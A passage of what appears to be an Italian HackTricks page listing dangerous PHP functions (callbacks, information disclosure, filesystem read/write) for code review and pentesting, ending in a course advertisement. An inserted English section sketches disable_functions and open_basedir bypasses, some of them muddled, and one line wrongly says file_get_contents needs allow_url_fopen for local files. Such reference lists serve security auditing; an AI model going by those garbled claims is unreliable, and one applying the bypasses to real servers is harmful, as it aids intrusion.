'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```

### Divulgazione di informazioni

La maggior parte di queste chiamate di funzione non sono punti di ingresso. Tuttavia, potrebbe essere una vulnerabilit√† se i dati restituiti sono visibili a un attaccante. Se un attaccante pu√≤ vedere phpinfo(), √® sicuramente una vulnerabilit√†.

```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```

### Altro

In addition to the commonly used PHP functions, there are some other useful functions that can be used for various purposes during web application pentesting. These functions include `disable_functions` and `open_basedir`.

#### `disable_functions`

The `disable_functions` directive in PHP allows the administrator to disable certain functions for security reasons. This can prevent potential vulnerabilities from being exploited by attackers. However, it is possible to bypass this restriction using various techniques.

One common technique is to use the `shell_exec` function to execute commands. Since `shell_exec` is not always disabled, it can be used to execute arbitrary commands on the server. Another technique is to use the `system` function, which can also be used to execute commands.

#### `open_basedir`

The `open_basedir` directive restricts the files that can be accessed by PHP to a specific directory or set of directories. This can help prevent unauthorized access to sensitive files on the server. However, there are ways to bypass this restriction as well.

One technique is to use the `chdir` function to change the current working directory to a directory outside the restricted path. This allows access to files outside the `open_basedir` restriction. Another technique is to use the `symlink` function to create symbolic links to files outside the restricted path, bypassing the restriction.

It is important to note that these techniques should only be used for legitimate purposes, such as testing the security of a web application. Using them for malicious purposes is illegal and unethical.

```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```

### Funzioni del filesystem

Secondo RATS, tutte le funzioni del filesystem in PHP sono pericolose. Alcune di queste non sembrano molto utili per l'attaccante. Altre sono pi√π utili di quanto si possa pensare. Ad esempio, se allow\_url\_fopen=On, √® possibile utilizzare un URL come percorso del file, quindi una chiamata a copy($\_GET\['s'], $\_GET\['d']); pu√≤ essere utilizzata per caricare uno script PHP ovunque nel sistema. Inoltre, se un sito √® vulnerabile a una richiesta inviata tramite GET, tutte queste funzioni del filesystem possono essere utilizzate per indirizzare un attacco verso un altro host attraverso il tuo server.

**Gestore del filesystem aperto**

```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```

**Scrivere nel filesystem (parzialmente in combinazione con la lettura)**

```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```

**Leggere dal filesystem**

Per ottenere informazioni da un filesystem, √® possibile utilizzare la funzione `file_get_contents()`. Questa funzione restituisce il contenuto di un file come una stringa. √à importante notare che questa funzione richiede che la direttiva `allow_url_fopen` sia abilitata nel file di configurazione PHP.

Ecco un esempio di come utilizzare la funzione `file_get_contents()` per leggere il contenuto di un file:

```php
$fileContent = file_get_contents('/path/to/file');
echo $fileContent;
```

Assicurati di specificare il percorso corretto del file che desideri leggere.

**Nota:** L'utilizzo di questa funzione potrebbe essere limitato se la funzione `file_get_contents()` √® inclusa nella lista delle funzioni disabilitate (`disable_functions`) nel file di configurazione PHP o se √® presente una restrizione `open_basedir`. In tal caso, potrebbe essere necessario utilizzare altre tecniche per ottenere il contenuto del file desiderato.

```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
